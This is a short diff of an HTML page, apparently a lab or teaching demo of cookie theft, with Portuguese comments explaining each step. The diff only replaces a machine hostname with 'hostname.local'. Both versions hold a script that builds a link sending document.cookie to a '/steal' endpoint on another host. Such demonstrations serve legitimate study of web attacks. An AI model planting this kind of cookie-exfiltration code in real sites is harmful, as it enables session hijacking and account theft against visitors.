@@ -20,7 +20,7 @@
     <a href = 'http://www.example.com'>go to www.example.com</a>
 
     <!-- faz uma requisicao ao site do localhost, recebe a mensagem e cria um cookie -->
-    <img src = 'http://GSTSPO01NB84.local:8080/img'>
+    <img src = 'http://hostname.local:8080/img'>
 
     <script>
         //cria um objeto chamando o botao quando for clicado
@@ -33,7 +33,7 @@
         const steal = document.getElementById("aSteal")
 
         //atribui uma url para o objeto steal, passando o parametro 'v=document.cookie' na url
-        steal.href = `http://GSTSPO01NB84.local:8080/steal?v=${document.cookie}`
+        steal.href = `http://hostname.local:8080/steal?v=${document.cookie}`
     </script>
 </body>
 </html>
